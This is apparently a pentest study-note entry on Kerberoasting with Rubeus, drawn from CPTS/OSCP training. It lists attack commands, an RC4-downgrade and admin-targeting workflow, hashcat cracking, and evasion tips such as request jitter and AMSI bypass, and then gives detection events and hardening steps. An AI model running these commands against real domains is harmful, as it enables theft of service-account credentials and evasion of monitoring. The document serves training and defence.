name: Rubeus - Kerberoast (Windows)
description: Requests TGS tickets for all SPN accounts from a domain-joined host and prints hashcat-ready hashes. /nowrap prevents line breaks in the base64 hash output. /stats profiles the attack surface before pulling tickets. Preferred Windows tool for Kerberoasting.
source: CPTS Module 13: Active Directory Enumeration & Attacks
notes:
=== RUBEUS vs GETUSERSPNS.PY ===
Rubeus runs from a domain-joined Windows host using the current user's Kerberos
credentials (no explicit password needed). GetUserSPNs.py runs from Linux with
explicit credentials over the network. Both achieve the same result.

Rubeus advantages:
  - Runs natively on Windows without credentials prompt
  - /stats flag profiles attack surface before committing
  - /rc4opsec forces RC4 downgrade when AES is default
  - /ldapfilter enables precise targeting
  - /outfile saves hashes to file for transfer
  - /delay /jitter for slow-and-low approach

=== RUBEUS FLAGS ===
  /stats                     → profile only: count accounts, encryption types, show avg passwordAge
  /nowrap                    → output hash without line breaks (required for hashcat)
  /outfile:hashes.txt        → save to file instead of stdout
  /ldapfilter:'admincount=1' → only roast privileged accounts
  /user:sqlsvc               → roast single account (quieter)
  /rc4opsec                  → request RC4 even if AES is available (forces downgrade)
  /aes                       → explicitly request AES-encrypted tickets
  /pwdsetafter:01-01-2020    → filter by password age
  /delay:5000 /jitter:30     → slow the requests (5s ± 30% delay per ticket)

=== RECOMMENDED WORKFLOW ===
1. .\Rubeus.exe kerberoast /stats           → see what's there
2. .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap  → hit DA-level accounts first
3. Transfer hashes to Linux: hashcat -m 13100 hashes.txt rockyou.txt

=== DETECTION ===
Event 4769 (TGS Request) with RC4 encryption = red flag in hardened environments
/rc4opsec generates a specific KDC_ERR_ETYPE_NOSUPP error visible in Kerberos logs
Rubeus binary signature known to Windows Defender — may need obfuscation or AMSI bypass Also covered in: OSCP PEN-200 Chapter 22 (Attacking Active Directory Authentication).

examples.label: Stats first — see the attack surface
Force RC4 downgrade for faster cracking
Ch22 — roast all SPNs and save to file (PEN-200 pattern)

defense.why_it_works: Rubeus kerberoast requests TGS tickets for all SPN accounts and outputs crackable hashes from a Windows foothold.
defense.impact: Crackable TGS hashes for offline cracking of service-account passwords.
defense.detection: [MITRE T1558.003] Event 4769 (TGS requested) with RC4 encryption type (0x17) when AES is standard, or a burst of TGS requests for many SPNs from one source in a short window; a request for a honeypot SPN account is malicious by definition.
defense.artifacts: A burst of 4769 requests; the hashes; Rubeus execution.
defense.prevention: Use 100+ character passwords or gMSA for service accounts; disable RC4 (force AES); audit and remove unused SPNs; deploy honeypot SPN accounts to catch roasting; Defender for Identity flags mass TGS requests.
defense.evasion: Rubeus can force an RC4 downgrade (/rc4opsec, /tgtdeleg) to obtain crackable tickets even where AES is preferred; request one SPN at a time to stay under the bulk-4769 threshold.
defense.misconfiguration: Service accounts are registered with a Service Principal Name (SPN) but use weak, human-chosen passwords — or even share a password with other accounts. Any authenticated domain user can request a TGS for any SPN account, receiving a blob encrypted with that account's NTLM hash. The SPN registration itself is not the flaw; the flaw is weak passwords on SPN accounts and permitting RC4 encryption (which produces a shorter, faster-to-crack blob).
defense.vulnerable_config:
# Service account set up manually with a weak password + SPN
# Attacker can find these with:
Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet

# Bad state — password set 4 years ago, RC4 permitted:
# Name: svc_sql  PasswordLastSet: 2020-01-15  SPN: MSSQLSvc/db01.corp.local:1433
# RC4 (0x17) requested in TGS ticket — short hash, GPU-crackable

# Confirming RC4 is available:
Get-ADUser svc_sql -Properties msDS-SupportedEncryptionTypes
# msDS-SupportedEncryptionTypes: 0 (= RC4+AES both permitted if 0 or blank)
defense.secure_config:
# Fix 1 — Use Group Managed Service Accounts (gMSA): 240-char random passwords,
# auto-rotated by AD, no human ever knows the password
New-ADServiceAccount -Name gmsa_sql -DNSHostName sql.corp.local \
    -PrincipalsAllowedToRetrieveManagedPassword 'db-servers-grp'
Install-ADServiceAccount gmsa_sql

# Fix 2 — For legacy accounts that must keep SPNs:
# Set a 100+ character random password (AD max is 127 chars):
$pw = [System.Web.Security.Membership]::GeneratePassword(127,20)
Set-ADAccountPassword svc_sql -NewPassword (ConvertTo-SecureString $pw -AsPlainText -Force)

# Fix 3 — Disable RC4, require AES-only:
Set-ADUser svc_sql -KerberosEncryptionType AES128,AES256
# msDS-SupportedEncryptionTypes = 24 (AES128+AES256 only)
